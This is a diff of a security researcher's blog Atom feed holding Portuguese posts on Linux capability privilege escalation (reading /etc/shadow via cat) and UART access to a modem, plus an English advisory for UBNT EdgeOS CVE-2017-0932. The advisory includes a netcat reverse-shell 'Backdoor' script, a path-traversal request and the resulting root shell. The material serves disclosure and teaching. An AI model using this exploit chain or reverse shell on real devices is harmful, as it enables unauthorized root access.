-&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="hacking-tricks" /><category term="network" /><category term="pentest" /><summary type="html">Algumas vezes durante os projetos do dia-a-dia nos deparamos com acesso (ex: RCE) em que o host afetado que (aparentemente) não possui qualquer liberação de acesso à internet para a nossa boa e velha shell reversa. Dessa forma temos que procurar por alternativas para exfiltrar dados (ex: DNS) ou, antes disso, validar se realmente não temos qualquer acesso à internet.</summary></entry><entry xml:lang="br"><title type="html">Hacking Tricks: Escalação de Privilégio em Linux com Capability</title><link href="http://localhost:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability.html" rel="alternate" type="text/html" title="Hacking Tricks: Escalação de Privilégio em Linux com Capability" /><published>2019-01-08T00:00:00-02:00</published><updated>2019-01-08T00:00:00-02:00</updated><id>http://localhost:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability</id><content type="html" xml:base="http://localhost:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability.html">&lt;p&gt;Dizem que quando você adentra em uma máquina seja durante um pentest, durante um estudo ou outra coisa (haha) você já pode ser considerado root/SYSTEM. Que mesmo estando com um usuários com pouco ou nenhum privilégio, existem diversas maneiras de se escalar para a autoridade máxima daquele host (sem entrar em detalhes pedantes). Essa escalação de privilégio pode ser feito através de vulnerabilidades no kernel, por falhas de aplicativos ou pelo simples desleixo/vacilo do sysadmin da rede. Com isso estou dando inicio a uma serie de &lt;em&gt;hacking tricks&lt;/em&gt; que são utilizados em pentests, competições de CTF etc. E a primeira publicação será sobre escalação de privilégios com &lt;em&gt;Linux Capabilities&lt;/em&gt;. Boa leitura!&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="hacking-tricks" /><category term="hacking-tricks" /><category term="network" /><category term="pentest" /><summary type="html">Algumas vezes durante os projetos do dia-a-dia nos deparamos com acesso (ex: RCE) em que o host afetado que (aparentemente) não possui qualquer liberação de acesso à internet para a nossa boa e velha shell reversa. Dessa forma temos que procurar por alternativas para exfiltrar dados (ex: DNS) ou, antes disso, validar se realmente não temos qualquer acesso à internet.</summary></entry><entry xml:lang="br"><title type="html">Hacking Tricks: Escalação de Privilégio em Linux com Capability</title><link href="http://0.0.0.0:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability.html" rel="alternate" type="text/html" title="Hacking Tricks: Escalação de Privilégio em Linux com Capability" /><published>2019-01-08T00:00:00-02:00</published><updated>2019-01-08T00:00:00-02:00</updated><id>http://0.0.0.0:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability</id><content type="html" xml:base="http://0.0.0.0:4000/hacking-tricks/2019/01/08/linux-privesc-with-capability.html">&lt;p&gt;Dizem que quando você adentra em uma máquina seja durante um pentest, durante um estudo ou outra coisa (haha) você já pode ser considerado root/SYSTEM. Que mesmo estando com um usuários com pouco ou nenhum privilégio, existem diversas maneiras de se escalar para a autoridade máxima daquele host (sem entrar em detalhes pedantes). Essa escalação de privilégio pode ser feito através de vulnerabilidades no kernel, por falhas de aplicativos ou pelo simples desleixo/vacilo do sysadmin da rede. Com isso estou dando inicio a uma serie de &lt;em&gt;hacking tricks&lt;/em&gt; que são utilizados em pentests, competições de CTF etc. E a primeira publicação será sobre escalação de privilégios com &lt;em&gt;Linux Capabilities&lt;/em&gt;. Boa leitura!&lt;/p&gt;
 
 &lt;h3 id=&quot;o-que-são-capabilities&quot;&gt;O que são &lt;em&gt;capabilities&lt;/em&gt;&lt;/h3&gt;
 
@@ -262,9 +262,9 @@ Ncat: Connected to 68.xxx.xxx.181:8080.
 
 &lt;h3 id=&quot;como-funciona&quot;&gt;Como funciona?&lt;/h3&gt;
 
-&lt;p&gt;Para o resito de escalação de privilégio, podemos iniciar enumerando todas as &lt;em&gt;capabilities&lt;/em&gt; disponível no sistema. Isso é feito através do comando &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt;, que pode ser executado para buscar de maneira recursiva (&lt;code class=&quot;highlighter-rouge&quot;&gt;-r&lt;/code&gt;) a partir da raiz (&lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt;) do sistema de arquivos:&lt;/p&gt;
+&lt;p&gt;Para o resito de escalação de privilégio, podemos iniciar enumerando todas as &lt;em&gt;capabilities&lt;/em&gt; disponível no sistema. Isso é feito através do comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getcap&lt;/code&gt;, que pode ser executado para buscar de maneira recursiva (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-r&lt;/code&gt;) a partir da raiz (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;) do sistema de arquivos:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ /sbin/getcap -r / 2&amp;gt;/dev/null
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ /sbin/getcap -r / 2&amp;gt;/dev/null
 /usr/bin/rsh = cap_net_bind_service+ep
 /usr/bin/rlogin = cap_net_bind_service+ep
 /usr/bin/dumpcap = cap_dac_override,cap_net_admin,cap_net_raw+eip
@@ -274,21 +274,21 @@ Ncat: Connected to 68.xxx.xxx.181:8080.
 /usr/lib/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Nota-se que antes o binário &lt;code class=&quot;highlighter-rouge&quot;&gt;ping&lt;/code&gt;, que geralmente era &lt;code class=&quot;highlighter-rouge&quot;&gt;suid&lt;/code&gt;, hoje ainda pertence ao &lt;em&gt;root&lt;/em&gt;, porém sem o &lt;em&gt;suid bit&lt;/em&gt; habilitado:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CAP_NET_RAW
+&lt;p&gt;Nota-se que antes o binário &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt;, que geralmente era &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suid&lt;/code&gt;, hoje ainda pertence ao &lt;em&gt;root&lt;/em&gt;, porém sem o &lt;em&gt;suid bit&lt;/em&gt; habilitado:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CAP_NET_RAW
       * Use RAW and PACKET sockets;
       * bind to any address for transparent proxying.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;O que faz com que esse binário seja possível montar e enviar pacotes &lt;em&gt;raw&lt;/em&gt; na rede é a &lt;em&gt;capability&lt;/em&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_net_raw&lt;/code&gt;, como podemos ver na &lt;em&gt;man page&lt;/em&gt;:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ ls -la /usr/bin/ping
+&lt;p&gt;O que faz com que esse binário seja possível montar e enviar pacotes &lt;em&gt;raw&lt;/em&gt; na rede é a &lt;em&gt;capability&lt;/em&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cap_net_raw&lt;/code&gt;, como podemos ver na &lt;em&gt;man page&lt;/em&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ ls -la /usr/bin/ping
 -rwxr-xr-x 1 root 60112 Jul 12 01:52 /usr/bin/ping
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Um outro exemplo é o &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/dumpcap&lt;/code&gt;, que é utilizado pelo &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt;. Essa aplicação que valida se o usuário pertence ao grupo &lt;code class=&quot;highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; para, então, permitir que o mesmo capture o tráfego de rede sem precisar do &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo&lt;/code&gt; ou de escalar para &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Um outro exemplo é o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/dumpcap&lt;/code&gt;, que é utilizado pelo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wireshark&lt;/code&gt;. Essa aplicação que valida se o usuário pertence ao grupo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wireshark&lt;/code&gt; para, então, permitir que o mesmo capture o tráfego de rede sem precisar do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; ou de escalar para &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
 
-&lt;p&gt;Na listagem acima é possível notar que temos o &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/cat&lt;/code&gt; com a &lt;code class=&quot;highlighter-rouge&quot;&gt;capability cap_dac_read_search&lt;/code&gt;. Para garantir o entendimento desse atributo, vamos ver o que a &lt;em&gt;man page&lt;/em&gt; diz sobre ele:&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CAP_DAC_READ_SEARCH
+&lt;p&gt;Na listagem acima é possível notar que temos o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/cat&lt;/code&gt; com a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capability cap_dac_read_search&lt;/code&gt;. Para garantir o entendimento desse atributo, vamos ver o que a &lt;em&gt;man page&lt;/em&gt; diz sobre ele:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CAP_DAC_READ_SEARCH
       * Bypass file read permission checks and directory read and
         execute permission checks;
       * invoke open_by_handle_at(2);
@@ -296,17 +296,17 @@ Ncat: Connected to 68.xxx.xxx.181:8080.
         file referred to by a file descriptor.
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Como pode ser visto, temos uma falha de segurança, pois o &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; possui a &lt;em&gt;capability&lt;/em&gt; de &lt;em&gt;bypassar&lt;/em&gt; a checagem de permissão de leitura feita pelo kernel. Dessa forma mesmo sem &lt;code class=&quot;highlighter-rouge&quot;&gt;suid bit&lt;/code&gt; ou sem ser &lt;em&gt;root&lt;/em&gt; é possível ler qualquer arquivo utilizando o mesmo:&lt;/p&gt;
+&lt;p&gt;Como pode ser visto, temos uma falha de segurança, pois o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; possui a &lt;em&gt;capability&lt;/em&gt; de &lt;em&gt;bypassar&lt;/em&gt; a checagem de permissão de leitura feita pelo kernel. Dessa forma mesmo sem &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;suid bit&lt;/code&gt; ou sem ser &lt;em&gt;root&lt;/em&gt; é possível ler qualquer arquivo utilizando o mesmo:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ cat /etc/shadow | grep root
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maycon@hacknroll:~$ cat /etc/shadow | grep root
 root:$6$X.E.toNpWI9G4IL3$8gwwSdv...snip...Ky1duJ9xP6c94Lg.:17870::::::
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;É claro que o &lt;code class=&quot;highlighter-rouge&quot;&gt;cat&lt;/code&gt; foi posto de maneira proposital para exemplificar. Porém as capabilities do &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/dumpcap&lt;/code&gt;, por exemplo, são padrões nos ambientes que possuem &lt;em&gt;wireshark&lt;/em&gt; instalado (eg: Kali Linux). Então fica como exercício para casa descobrir uma forma de escalar privilégio em ambientes cujo seu usuário é não privilegiado e está no grupo &lt;em&gt;wireshark&lt;/em&gt; (hint: &lt;code class=&quot;highlighter-rouge&quot;&gt;cap_dac_override&lt;/code&gt; vai te ajudar).&lt;/p&gt;
+&lt;p&gt;É claro que o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; foi posto de maneira proposital para exemplificar. Porém as capabilities do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/dumpcap&lt;/code&gt;, por exemplo, são padrões nos ambientes que possuem &lt;em&gt;wireshark&lt;/em&gt; instalado (eg: Kali Linux). Então fica como exercício para casa descobrir uma forma de escalar privilégio em ambientes cujo seu usuário é não privilegiado e está no grupo &lt;em&gt;wireshark&lt;/em&gt; (hint: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cap_dac_override&lt;/code&gt; vai te ajudar).&lt;/p&gt;
 
 &lt;h3 id=&quot;conclusão&quot;&gt;Conclusão&lt;/h3&gt;
 
-&lt;p&gt;Essa foi uma escrita rápida para demonstrar uma forma bem interessante de escalar privilégio em sistemas Linux. Espero poder ter tempo para escrever outros &lt;em&gt;hacking tricks&lt;/em&gt; e contribuir de alguma forma com quem está iniciando. Quem quiser brincar mais com isso basta ler a &lt;em&gt;man page&lt;/em&gt;  e utilizar os comandos &lt;code class=&quot;highlighter-rouge&quot;&gt;getcap&lt;/code&gt; e &lt;code class=&quot;highlighter-rouge&quot;&gt;setcap&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Essa foi uma escrita rápida para demonstrar uma forma bem interessante de escalar privilégio em sistemas Linux. Espero poder ter tempo para escrever outros &lt;em&gt;hacking tricks&lt;/em&gt; e contribuir de alguma forma com quem está iniciando. Quem quiser brincar mais com isso basta ler a &lt;em&gt;man page&lt;/em&gt;  e utilizar os comandos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getcap&lt;/code&gt; e &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setcap&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;Para dúvidas, sugestões ou reclamações basta utilizar o espaço de comentários abaixo ou os contatos disponíveis na barra lateral do site.&lt;/p&gt;
 
@@ -315,7 +315,7 @@ root:$6$X.E.toNpWI9G4IL3$8gwwSdv...snip...Ky1duJ9xP6c94Lg.:17870::::::
 &lt;h3 id=&quot;referências&quot;&gt;Referências&lt;/h3&gt;
 &lt;ul&gt;
   &lt;li&gt;&lt;a href=&quot;http://man7.org/linux/man-pages/man7/capabilities.7.html&quot;&gt;man 7 capabilities&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="hacking-tricks" /><category term="privilege-escalation" /><category term="linux" /><category term="capability" /><summary type="html">Dizem que quando você adentra em uma máquina seja durante um pentest, durante um estudo ou outra coisa (haha) você já pode ser considerado root/SYSTEM. Que mesmo estando com um usuários com pouco ou nenhum privilégio, existem diversas maneiras de se escalar para a autoridade máxima daquele host (sem entrar em detalhes pedantes). Essa escalação de privilégio pode ser feito através de vulnerabilidades no kernel, por falhas de aplicativos ou pelo simples desleixo/vacilo do sysadmin da rede. Com isso estou dando inicio a uma serie de hacking tricks que são utilizados em pentests, competições de CTF etc. E a primeira publicação será sobre escalação de privilégios com Linux Capabilities. Boa leitura!</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Acessando a interface UART/Serial</title><link href="http://localhost:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART.html" rel="alternate" type="text/html" title="Embedded Hacking: Acessando a interface UART/Serial" /><published>2018-03-10T00:00:00-03:00</published><updated>2018-03-10T00:00:00-03:00</updated><id>http://localhost:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART</id><content type="html" xml:base="http://localhost:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART.html">&lt;p&gt;Na última publicação foi falado sobre uma forma de se iniciar o processo de análise dinâmica de alguns binários utilizando o qemu. A principal vantagem dessa técnica é a possibilidade de conseguir dinamicamente analisar alguns binários sem a necessidade de possuir o hardware em mãos. Porém, tendo o hardware em mãos, muitas vezes é possível identificar uma interface serial no dispositivo, que resulta praticamente no acesso a um console do dispositivo. Nessa publicação será explicado como podemos identificar e acessar essa interface serial presente em praticamente todos os dispositivos embarcados.&lt;/p&gt;
+&lt;/ul&gt;</content><author><name>Maycon Vitali</name></author><category term="hacking-tricks" /><category term="hacking-tricks" /><category term="privilege-escalation" /><category term="linux" /><category term="capability" /><summary type="html">Dizem que quando você adentra em uma máquina seja durante um pentest, durante um estudo ou outra coisa (haha) você já pode ser considerado root/SYSTEM. Que mesmo estando com um usuários com pouco ou nenhum privilégio, existem diversas maneiras de se escalar para a autoridade máxima daquele host (sem entrar em detalhes pedantes). Essa escalação de privilégio pode ser feito através de vulnerabilidades no kernel, por falhas de aplicativos ou pelo simples desleixo/vacilo do sysadmin da rede. Com isso estou dando inicio a uma serie de hacking tricks que são utilizados em pentests, competições de CTF etc. E a primeira publicação será sobre escalação de privilégios com Linux Capabilities. Boa leitura!</summary></entry><entry xml:lang="br"><title type="html">Embedded Hacking: Acessando a interface UART/Serial</title><link href="http://0.0.0.0:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART.html" rel="alternate" type="text/html" title="Embedded Hacking: Acessando a interface UART/Serial" /><published>2018-03-10T00:00:00-03:00</published><updated>2018-03-10T00:00:00-03:00</updated><id>http://0.0.0.0:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART</id><content type="html" xml:base="http://0.0.0.0:4000/embedded-hacking/2018/03/10/embedded-hacking-acessando-interface-UART.html">&lt;p&gt;Na última publicação foi falado sobre uma forma de se iniciar o processo de análise dinâmica de alguns binários utilizando o qemu. A principal vantagem dessa técnica é a possibilidade de conseguir dinamicamente analisar alguns binários sem a necessidade de possuir o hardware em mãos. Porém, tendo o hardware em mãos, muitas vezes é possível identificar uma interface serial no dispositivo, que resulta praticamente no acesso a um console do dispositivo. Nessa publicação será explicado como podemos identificar e acessar essa interface serial presente em praticamente todos os dispositivos embarcados.&lt;/p&gt;
 
 &lt;h3 id=&quot;a-interface-uart&quot;&gt;A interface UART&lt;/h3&gt;
 
@@ -345,7 +345,7 @@ root:$6$X.E.toNpWI9G4IL3$8gwwSdv...snip...Ky1duJ9xP6c94Lg.:17870::::::
 &lt;p&gt;No equipamento que tenho utilizado para escrever essa série de publicações (o &lt;em&gt;MitraStar DSL-100HN-T1-NV&lt;/em&gt;) esses pinos foram facilmente identificados e, para minha sorte, os mesmos já estava disponível com toda a pinagem disponível, sem existir a necessidade de se soldar os pinos à placa.&lt;/p&gt;
 
 &lt;p&gt;Abaixo é possível ter uma visão da placa interna do modem:
-&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/03/vivo-board.jpg&quot; alt=&quot;DSL-100HN-T1-NV - Placa Interna&quot; /&gt;&lt;/p&gt;
+&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/03/vivo-board.jpg&quot; alt=&quot;DSL-100HN-T1-NV - Placa Interna&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Reparem que, apesar de existirem 5 conectores próximos um do outro, somente 4 deles possuem pinos para conexão. O quinto conector poderia ser parte da interface UART, porém obviamente testei primeiro os 4 com pinos disponíveis e, como de imaginar, foi suficiente para acessar a interface serial do dispositivo.&lt;/p&gt;
 
@@ -363,7 +363,7 @@ root:$6$X.E.toNpWI9G4IL3$8gwwSdv...snip...Ky1duJ9xP6c94Lg.:17870::::::
 
 &lt;p&gt;O próximo passo após identificar a pinagem UART na placa do dispositivo embarcado é ligá-la corretamente a um computador para que possamos acessar a interface serial. Para isso podemos utilizar um simples conversor USB/Serial, que é super barato mesmo comprando no &lt;a href=&quot;https://eletronicos.mercadolivre.com.br/pecas-componentes-eletricos/conversor-usb-serial-ttl&quot;&gt;Mercado Livre&lt;/a&gt;. Esses conversores possuem preços a partir de R$ 8,00, o que o torna acessível para a maioria das pessoas.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/03/conversor-usb-ttl.png&quot; alt=&quot;Conversor USB-TTL&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/03/conversor-usb-ttl.png&quot; alt=&quot;Conversor USB-TTL&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Para fazer a ligação, iremos utilizar TRÊS dos QUATRO pinos detectados anteriormente. É importante relembrar que NÃO UTILIZAREMOS a pinagem VCC em momento algum para acessar a interface UART do dispositivo. Se por acaso você ligar o VCC da sua placa com o VCC do conversor, lembre-se que ambas estão FORNECENDO corrente e, por isso, o resultado não será agradável. Dito isso, a ligação deve ser feita da seguinte forma:&lt;/p&gt;
 
@@ -375,7 +375,7 @@ root:$6$X.E.toNpWI9G4IL3$8gwwSdv...snip...Ky1duJ9xP6c94Lg.:17870::::::
 
 &lt;p&gt;Com isso teremos uma ligação semelhante ao demostrado na figura abaixo:&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/posts/2018/03/conexao-uart.jpg&quot; alt=&quot;Conversor USB-TTL&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://0.0.0.0:4000/assets/images/posts/2018/03/conexao-uart.jpg&quot; alt=&quot;Conversor USB-TTL&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;detecção-do-baudrate&quot;&gt;Detecção do Baudrate&lt;/h3&gt;
 
@@ -401,7 +401,7 @@ root:$6$X.E.toNpWI9G4IL3$8gwwSdv...snip...Ky1duJ9xP6c94Lg.:17870::::::
 
 &lt;p&gt;Espero que quem está acompanhando a série esteja gostando. E caso tenham alguma dúvida ou sugestão basta utilizar os campos de comentários abaixo ou entrar em contato diretamente comigo pelos meios de contato na barra lateral.&lt;/p&gt;
 
-&lt;p&gt;Cheers,&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="uart" /><category term="serial" /><summary type="html">Na última publicação foi falado sobre uma forma de se iniciar o processo de análise dinâmica de alguns binários utilizando o qemu. A principal vantagem dessa técnica é a possibilidade de conseguir dinamicamente analisar alguns binários sem a necessidade de possuir o hardware em mãos. Porém, tendo o hardware em mãos, muitas vezes é possível identificar uma interface serial no dispositivo, que resulta praticamente no acesso a um console do dispositivo. Nessa publicação será explicado como podemos identificar e acessar essa interface serial presente em praticamente todos os dispositivos embarcados.</summary></entry><entry xml:lang="en"><title type="html">UBNT EdgeOS &amp;lt;= v1.9.1.1 Local Privilege Escalation</title><link href="http://localhost:4000/advisories/2018/03/05/CVE-2017-0932.html" rel="alternate" type="text/html" title="UBNT EdgeOS &lt;= v1.9.1.1 Local Privilege Escalation" /><published>2018-03-05T00:00:00-03:00</published><updated>2018-03-05T00:00:00-03:00</updated><id>http://localhost:4000/advisories/2018/03/05/CVE-2017-0932</id><content type="html" xml:base="http://localhost:4000/advisories/2018/03/05/CVE-2017-0932.html">&lt;p&gt;UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system.&lt;/p&gt;
+&lt;p&gt;Cheers,&lt;/p&gt;</content><author><name>Maycon Vitali</name></author><category term="embedded-hacking" /><category term="embedded-devices" /><category term="hacking-embedded" /><category term="IoT-hacking" /><category term="uart" /><category term="serial" /><summary type="html">Na última publicação foi falado sobre uma forma de se iniciar o processo de análise dinâmica de alguns binários utilizando o qemu. A principal vantagem dessa técnica é a possibilidade de conseguir dinamicamente analisar alguns binários sem a necessidade de possuir o hardware em mãos. Porém, tendo o hardware em mãos, muitas vezes é possível identificar uma interface serial no dispositivo, que resulta praticamente no acesso a um console do dispositivo. Nessa publicação será explicado como podemos identificar e acessar essa interface serial presente em praticamente todos os dispositivos embarcados.</summary></entry><entry xml:lang="en"><title type="html">UBNT EdgeOS &amp;lt;= v1.9.1.1 Local Privilege Escalation</title><link href="http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932.html" rel="alternate" type="text/html" title="UBNT EdgeOS &amp;lt;= v1.9.1.1 Local Privilege Escalation" /><published>2018-03-05T00:00:00-03:00</published><updated>2018-03-05T00:00:00-03:00</updated><id>http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932</id><content type="html" xml:base="http://0.0.0.0:4000/advisories/2018/03/05/CVE-2017-0932.html">&lt;p&gt;UBNT EdgeOS version 1.9.1.1 and prior, consequence of the lack of validation on the input of the Feature functionality, an attacker with access to an operator (read-only) account and ssh connection to the devices, can escalate privileges to admin (root) access in the system.&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Vendor: Ubiquiti Networks&lt;/li&gt;
@@ -418,14 +418,14 @@ root:$6$X.E.toNpWI9G4IL3$8gwwSdv...snip...Ky1duJ9xP6c94Lg.:17870::::::
 
 &lt;p&gt;First of all, we have to create the following file+directory:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat Backdoor/wizard-run
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat Backdoor/wizard-run
 #!/bin/bash
 /usr/bin/nc 192.168.2.2:1337 -e /bin/bash &amp;amp;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Using a non-privileged ‘operator’ user, it was possible to upload the file to the device using the scp command:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ scp -r Backdoor operator@192.168.2.1:~
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ scp -r Backdoor operator@192.168.2.1:~
 Welcome to EdgeOS
 
 By logging in, accessing, or using the Ubiquiti product, you
@@ -433,13 +433,13 @@ acknowledge that you have read and understood the Ubiquiti
 License Agreement (available in the Web UI at, by default,
 http://192.168.1.1) and agree to be bound by its terms.
 
-operator@192.168.2.1's password: 
+operator@192.168.2.1&apos;s password: 
 wizard-run       
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;After that, using a valid operator session and a path traversal vulnerability, it was possible to call the uploaded file with root privilege:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /api/edge/feature.json HTTP/1.1
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /api/edge/feature.json HTTP/1.1
 Host: 192.168.2.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
 Accept: application/json, text/javascript, */*; q=0.01
@@ -457,7 +457,7 @@ Connection: close
 
 &lt;p&gt;And a remote shell will be created:&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lvp 1337
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ nc -lvp 1337
 Listening on [0.0.0.0] (family 0, port 1337)
 Connection from 192.168.2.1 44440 received!
 id
@@ -497,7 +497,7 @@ operator:$6$7SVNi.WB68V0QR5t$efMoCyT2H.mEU6M8s2NDSsW1fv7JnT2eAfK2VxuzsIdcYrEvWCI
   &lt;li&gt;&lt;a href=&quot;http://maycon.hacknroll.io/advisories/2018/03/05/CVE-2017-0932.html&quot;&gt;Maycon’s Page&lt;/a&gt;&lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/239719&quot;&gt;HackerOne Partial Report&lt;/a&gt;&lt;/li&gt;
